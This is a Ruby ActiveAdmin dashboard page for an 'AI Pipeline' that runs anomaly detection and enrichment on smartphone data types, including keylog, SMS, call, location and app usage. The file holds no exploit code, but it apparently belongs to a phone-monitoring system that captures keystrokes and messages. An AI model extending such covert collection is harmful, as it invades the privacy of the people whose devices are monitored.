# frozen_string_literal: true

ActiveAdmin.register_page "AI Pipeline" do
  menu label: "🔄 AI Pipeline", parent: "🧠 AI", priority: 3

  content title: "🔄 AI Pipeline Dashboard" do
    devices = Smartphone.all

    # Pipeline Status
    div class: "pipeline-status-section" do
      h2 "Pipeline Status"
      div class: "pipeline-stats-grid", id: "pipeline-stats" do
        div class: "stat-card" do
          h4 "Status"
          span id: "pipeline-running" do
            text_node "Initializing..."
          end
        end
        div class: "stat-card" do
          h4 "Processed"
          span id: "pipeline-processed" do
            text_node "0"
          end
        end
        div class: "stat-card" do
          h4 "Errors"
          span id: "pipeline-errors" do
            text_node "0"
          end
        end
        div class: "stat-card" do
          h4 "Queue Size"
          span id: "pipeline-queue" do
            text_node "0"
          end
        end
      end
    end

    # Anomaly Alerts
    div class: "anomaly-alerts-section" do
      h2 "Recent Anomaly Alerts"
      table_for Alert.where("title LIKE ?", "%anomaly%").order(created_at: :desc).limit(25) do
        column :id
        column :title
        column :severity
        column(:device) { |a| a.device&.name || "Unknown" }
        column :message do |alert|
          truncate(alert.message, length: 120)
        end
        column :triggered_at
        column(:acknowledged) { |a| a.acknowledged_at.present? ? "✅" : "❌" }
      end
    end

    # Registered Processors
    div class: "processors-section" do
      h2 "Processing Pipeline"
      ul do
        li "AiPipeline::AnomalyDetector — Statistical & location anomaly detection"
        li "AiPipeline::DataEnricher — Geocoding, contact resolution, app categorization"
      end
    end

    # Device selector for manual processing
    if devices.any?
      div class: "manual-trigger-section" do
        h2 "Manual Pipeline Trigger"
        div class: "device-selector" do
          label "Device:", for: "pipeline-device-select"
          select id: "pipeline-device-select" do
            devices.each do |device|
              option value: device.device_id do
                text_node "#{device.name} (#{device.device_id})"
              end
            end
          end
          select id: "pipeline-data-type" do
            %w[keylog sms call location app_usage].each do |dt|
              option value: dt do
                text_node dt.titleize
              end
            end
          end
          button "Run Pipeline", id: "run-pipeline-btn", class: "pipeline-action-btn"
        end
      end
    end

    script do
      text_node <<~JS.html_safe
        document.addEventListener('DOMContentLoaded', function() {
          var btn = document.getElementById('run-pipeline-btn');
          if (btn) {
            btn.addEventListener('click', function() {
              var deviceId = document.getElementById('pipeline-device-select').value;
              var dataType = document.getElementById('pipeline-data-type').value;
              fetch('/admin/ai_pipeline/trigger', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                  'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({ device_id: deviceId, data_type: dataType })
              })
              .then(function(r) { return r.json(); })
              .then(function(data) { alert('Pipeline result: ' + JSON.stringify(data.anomalies_count || 0) + ' anomalies detected'); })
              .catch(function(err) { alert('Error: ' + err.message); });
            });
          }
        });
      JS
    end
  end

  page_action :trigger, method: :post do
    device_id = params[:device_id]
    data_type = params[:data_type] || 'keylog'

    pipeline = AiPipeline::PipelineManager.new
    pipeline.register(AiPipeline::AnomalyDetector.new, priority: :high)
    pipeline.register(AiPipeline::DataEnricher.new, priority: :normal)

    result = pipeline.process(device_id, data_type, {})
    render json: {
      status: 'completed',
      anomalies_count: result[:anomalies]&.size || 0,
      anomalies: result[:anomalies],
      enrichments: result[:enrichments],
      errors: result[:errors]
    }
  end

  page_action :status, method: :get do
    pipeline = AiPipeline::PipelineManager.new
    render json: pipeline.status
  end
end
